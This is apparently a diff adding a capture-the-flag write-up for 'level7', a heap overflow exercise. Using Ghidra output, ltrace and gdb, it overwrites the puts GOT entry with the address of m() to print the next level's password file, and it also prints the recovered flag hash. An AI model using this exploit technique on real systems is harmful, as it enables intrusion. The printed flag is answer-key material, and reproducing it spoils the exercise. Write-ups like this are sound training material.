@@ -1,0 +1,82 @@
+We have an executable that we disass with Ghidra as allways.
+we've got this main:
+
+void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
+{
+  time_t tVar1;
+  
+  tVar1 = time((time_t *)0x0);
+  printf("%s - %d\n",c,tVar1);
+  return;
+}
+
+undefined4 main(undefined4 param_1,int param_2)
+{
+  undefined4 *puVar1;
+  void *pvVar2;
+  undefined4 *puVar3;
+  FILE *__stream;
+  
+  puVar1 = (undefined4 *)malloc(8);
+  *puVar1 = 1;
+  pvVar2 = malloc(8);
+  *(void **)(puVar1 + 1) = pvVar2;
+  puVar3 = (undefined4 *)malloc(8);
+  *puVar3 = 2;
+  pvVar2 = malloc(8);
+  *(void **)(puVar3 + 1) = pvVar2;
+  strcpy((char *)puVar1[1],*(char **)(param_2 + 4));
+  strcpy((char *)puVar3[1],*(char **)(param_2 + 8));
+  __stream = fopen("/home/user/level8/.pass","r");
+  fgets(c,0x44,__stream);
+  puts("~~");
+  return 0;
+}
+
+we have to find the spot where the first arguments is making the segfault, we use pattern to find the right spot:
+
+ltrace ./level7 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH 0000111122223333444455556666
+__libc_start_main(0x8048521, 3, 0xbffff794, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                              = 0x0804a008
+malloc(8)                                              = 0x0804a018
+malloc(8)                                              = 0x0804a028
+malloc(8)                                              = 0x0804a038
+strcpy(0x0804a018, "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH") = 0x0804a018
+strcpy(0x46464646, "0000111122223333444455556666" <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+we can see 0x46464646 thats equivalent to FFFF so its from the 20 bytes that the segfault is made.
+then we get the address of m function to print our stream righten into c:
+
+(gdb) info functions
+0x080484f4  m
+
+then we know with this line:
+strcpy(0x46464646, "0000111122223333444455556666" <unfinished ...>
+that the second argument is copyied into the block of memory assigned by FFFF.
+
+AAAABBBBCCCCDDDDEEEE = 20 bytes
+
+then we find our GOT (0x8049928) for puts to call m function:
+
+(gdb) disass puts
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:	jmp    *0x8049928
+   0x08048406 <+6>:	push   $0x28
+   0x0804840b <+11>:	jmp    0x80483a0
+
+so we need to have this now:
+
+strcpy( 20 bytes + addr GOT, addr of m() )
+
+./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"')  $(python -c 'print"\xf4\x84\x04\x08"')
+
+then we finnaly get this:
+
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1685112687
+
+first => c => %s => .pass
+second => t => %d => tVar1
+
